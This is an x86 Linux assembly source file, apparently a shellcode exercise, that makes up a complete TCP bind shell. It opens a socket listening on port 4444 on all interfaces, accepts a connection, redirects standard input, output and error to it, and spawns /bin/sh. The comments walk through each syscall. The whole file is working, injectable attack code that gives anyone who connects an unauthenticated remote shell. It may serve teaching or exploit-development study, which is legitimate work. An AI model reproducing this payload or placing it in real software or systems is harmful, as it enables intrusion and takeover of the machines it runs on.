global _start

section .text

_start:

	; CREATE SOCKET
	; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	; syscall: socketcall (102) --> int socketcall(int call, unsigned long *args);
	; syscall parameters:
	; - int call: socket function to invoke
	; - *args: points to a block containing the actual arguments, which are passed through to the appropiate call

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov bl, 0x1 	; sys_socket function (1)
	push eax    	; IPPROTO_TCP (0)
	push ebx	; SOCK_STREAM (1)
	push 0x2	; AF_INET     (2)
	mov ecx, esp	; ECX points to actual arguments
	mov al, 0x66	; socketcall
	int 0x80

	; BIND SOCKET TO ADDRESS
	; bind(socket_des, (struct sockaddr*) &client_addr, sizeof(client_addr));
	; struct sockaddr:
	; - client_addr.sin_family = AF_INET;
 	; - client_addr.sin_port = htons(PORT);
  	; - client_addr.sin_addr.s_addr = INADDR_ANY;
	; sizeof = 0x10 (16)

	mov esi, eax 	; File descriptor for the new socket returned from last syscall (create socket)
	pop ebx      	; SYS_BIND (2)
	xor edx, edx	; zero edx
	push edx     	; client_addr INADDR_ANY --> (0.0.0.0) 0x0000000
	push word 0x5c11  	; client_addr PORT --> (4444) 0x115c
	push bx	     	; AF_INET (2)
	mov ecx, esp	; ECX contains memory address that points to struct sockaddr
	push 0x10    	; sizeof address; 0x10 (16)
	push ecx     	; struct sockaddr
	push esi     	; socket_des
	mov ecx, esp 	; ECX contained memory address that points to actual arguments
	mov al, 0x66 	; socketcall
	int 0x80

	; LISTEN
	; listen(socket_des, 0);

	xor eax, eax	; zero eax
	push eax	; backlog
	push esi	; socket file descritor
	mov ecx, esp	; ECX contains memory address that points to actual arguments
	add ebx, 0x2	; SYS_LISTEN (0x4) socket function
	mov al, 0x66	; socketcall
	int 0x80

	; ACCEPT CONNECTION
	; socket_client = accept(socket_des, NULL, NULL);
	cdq	 	; zero edx
	push edx	; NULL
	push edx	; NULL
	push esi	; socket file descriptor
	mov ecx, esp	; ECX contains memory address that points to actual arguments
	add bx, 0x1	; SYS_ACCEPT (0x5) socket function
	mov al, 0x66	; socketcall
	int 0x80

	; REDIRECT FILE DESCRIPTORS STDIN, STDOUT, STDERR
	xor ecx, ecx	; zero ECX
	mov cl, 0x2	; To be used for the loop iterations (3 file descriptors stdin 0, stdout 1, stderr 2)
	mov ebx, eax	; EAX contain the returned value from the ACCEPT CONNECTION, it return  a  nonnegative  integer that
			; is a descriptor for the accepted socket.

fd_loop:
	mov al, 0x3f	; dup2 syscall
	int 0x80
	dec ecx		; for iteration over 2, 1 and 0
	jns fd_loop	; jump is not signed (will jump until ecx is negative)

	; EXECVE
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	xor ecx, ecx	; zero ECX, NULL for argv
	push ecx	; NULL for string termination
	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/
	mov ebx, esp	; EBX contains memory address that points to string with null termination
	mov edx, ecx	; NULL for EDX (envp)
	mov al, 0xb
	int 0x80
